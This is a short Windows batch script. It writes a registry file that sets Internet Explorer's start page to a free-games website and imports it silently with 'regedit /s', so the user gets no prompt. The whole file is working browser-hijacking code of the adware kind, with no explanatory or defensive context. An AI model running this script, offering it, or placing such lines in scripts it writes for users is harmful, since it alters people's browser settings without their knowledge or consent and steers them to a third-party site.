@ECHO OFF
ECHO REGEDIT4 >dostar.reg
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] >> dostar.reg
ECHO "Start Page"="http://start.free-windows-games.com" >> dostar.reg
START /w regedit /s dostar.reg
EXIT